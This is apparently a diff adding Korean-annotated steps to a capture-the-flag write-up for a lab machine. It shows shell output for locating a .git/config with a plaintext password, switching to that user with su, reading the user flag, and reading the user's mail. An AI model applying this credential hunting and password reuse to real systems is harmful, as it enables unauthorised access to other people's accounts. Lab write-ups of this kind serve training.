@@ -171,3 +171,108 @@ dr-xr-xr-x 13 root root 0 Jul 21 14:39 sys
 drwxrwxrwt 12 root root 4096 Jul 21 14:40 tmp
 drwxr-xr-x 14 root root 4096 Feb 23 2022 usr
 drwxr-xr-x 12 root root 4096 Dec 22 2023 var
+
+# think 발견
+
+ls -al /home
+total 16
+drwxr-xr-x 4 root root 4096 Jul 21 14:39 .
+drwxr-xr-x 18 root root 4096 Jul 21 14:39 ..
+drwxr-x--- 5 think think 4096 Jun 21 2023 think
+drwxr-xr-x 3 ubuntu ubuntu 4096 Jul 21 14:39 ubuntu
+
+$ ls -al /opt
+ls -al /opt
+total 12
+drwxr-xr-x 3 root root 4096 Jun 21 2023 .
+drwxr-xr-x 18 root root 4096 Jul 21 14:39 ..
+drwxrwxr-x 3 think think 4096 Jun 21 2023 dev
+
+ls -al /opt/dev/.git/
+ls -al /opt/dev/.git/
+total 52
+drwxrwxr-x 8 think think 4096 Jun 21 2023 .
+drwxrwxr-x 3 think think 4096 Jun 21 2023 ..
+drwxrwxr-x 2 think think 4096 Jun 21 2023 branches
+-rw-rw-r-- 1 think think 21 Jun 21 2023 COMMIT_EDITMSG
+-rw-rw-r-- 1 think think 296 Jun 21 2023 config
+-rw-rw-r-- 1 think think 73 Jun 21 2023 description
+-rw-rw-r-- 1 think think 23 Jun 21 2023 HEAD
+drwxrwxr-x 2 think think 4096 Jun 21 2023 hooks
+-rw-rw-r-- 1 think think 145 Jun 21 2023 index
+drwxrwxr-x 2 think think 4096 Jun 21 2023 info
+drwxrwxr-x 3 think think 4096 Jun 21 2023 logs
+drwxrwxr-x 7 think think 4096 Jun 21 2023 objects
+drwxrwxr-x 4 think think 4096 Jun 21 2023 refs
+
+# 단서 발견
+
+cat /opt/dev/.git/config
+cat /opt/dev/.git/config
+[core]
+repositoryformatversion = 0
+filemode = true
+bare = false
+logallrefupdates = true
+[user]
+name = Jose Mario
+email = josemlwdf@github.com
+
+[credential]
+helper = cache --timeout=3600
+
+[credential "https://github.com"]
+username = think
+password = _TH1NKINGPirate$_
+
+# 쉘 전환
+
+su - think 의미
+su는 **"switch user"**의 약자로, 현재 사용자에서 다른 사용자 계정으로 전환하는 명령어입니다.
+
+think는 전환하려는 사용자 이름(username) 입니다.
+
+- (하이픈)은 옵션으로, 로그인 셸(login shell) 환경으로 전환하겠다는 뜻입니다.
+
+# 로그인 쉘 전환 완료
+
+t open directory '/home/think': Permission denied
+$ su - think
+su - think
+Password: _TH1NKINGPirate$_
+
+think@ip-10-10-249-130:~$ ls
+ls
+snap user.txt
+think@ip-10-10-249-130:~$
+
+think@ip-10-10-249-130:~$ cat user.txt
+cat user.txt
+996bdb1f619a68361417cabca5454705
+think@ip-10-10-249-130:~$
+
+# 상당히 권한이 높아 보임
+
+think@ip-10-10-249-130:~$ id
+id
+uid=1000(think) gid=1000(think) groups=1000(think)
+think@ip-10-10-249-130:~$
+
+# 사용자 메일함 /var/mail/think 확인
+
+cat /var/mail/think
+From root@pyrat Thu Jun 15 09:08:55 2023
+Return-Path: <root@pyrat>
+X-Original-To: think@pyrat
+Delivered-To: think@pyrat
+Received: by pyrat.localdomain (Postfix, from userid 0)
+id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
+Subject: Hello
+To: <think@pyrat>
+X-Mailer: mail (GNU Mailutils 3.7)
+Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
+Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
+From: Dbile Admen <root@pyrat>
+
+Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
+think@ip-10-10-249-130:~$
